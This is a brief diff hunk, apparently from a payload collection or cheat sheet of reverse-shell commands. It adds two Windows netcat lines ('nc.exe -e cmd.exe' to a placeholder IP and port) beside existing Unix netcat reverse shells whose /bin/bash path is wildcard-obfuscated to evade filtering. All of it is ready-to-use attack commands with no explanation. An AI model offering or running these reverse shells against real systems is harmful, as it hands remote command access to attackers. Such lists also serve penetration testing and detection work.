@@ -183,6 +183,14 @@ nc -e /u?r/b?n/b??? {IP} {PORT}
 
 nc {IP} {PORT} -e /u?r/b?n/b???
 
+#EXAMPLE
+
+nc.exe -e cmd.exe {IP} {PORT}
+
+#EXAMPLE
+
+nc.exe -nv {IP} {PORT} -e cmd.exe
+
 #INDEX
 
 #EXAMPLE
